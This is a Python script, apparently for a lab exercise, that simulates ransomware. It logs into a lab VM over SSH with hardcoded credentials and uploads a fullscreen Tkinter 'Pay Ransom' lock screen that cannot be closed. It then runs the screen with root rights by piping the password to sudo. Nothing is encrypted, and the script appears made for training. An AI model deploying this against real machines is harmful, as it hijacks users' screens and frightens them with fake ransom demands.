#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    # The Tkinter Payload
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time

def pay_ransom():
    lbl.config(text="Decrypting...")
    root.update()
    for i in range(0, 101, 10):
        lbl.config(text=f"Decrypting your files... {i}%")
        root.update()
        time.sleep(0.2)
    root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True) 
root.configure(background='black')
root.overrideredirect(True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True)

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Connect using the CEO credentials
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        
        # We must make it executable and ensure CEO owns it
        ssh.exec_command(f"echo '{PASSWORD}' | sudo -S chown {USERNAME}:{USERNAME} /tmp/ransom_sim.py")
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI...")
        
        # We need to construct a command that properly passes the Wayland environment
        # XDG_RUNTIME_DIR is critical for Wayland to work.
        # We use sudo -S to pass the password non-interactively.
        
        # We also use `nohup` to detach the process so it stays alive after SSH closes.
        # We redirect errors to /tmp/gui_error.log so we can debug if it fails again.
        exec_cmd = (
            f"echo '{PASSWORD}' | sudo -S "
            f"env DISPLAY=:0 XDG_RUNTIME_DIR=/run/user/$(id -u {USERNAME}) WAYLAND_DISPLAY=wayland-0 "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2> /tmp/gui_error.log &"
        )
        
        print(f"[*] Executing payload on target...")
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        print("[*] (If it fails, check /tmp/gui_error.log on the target via SSH)")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
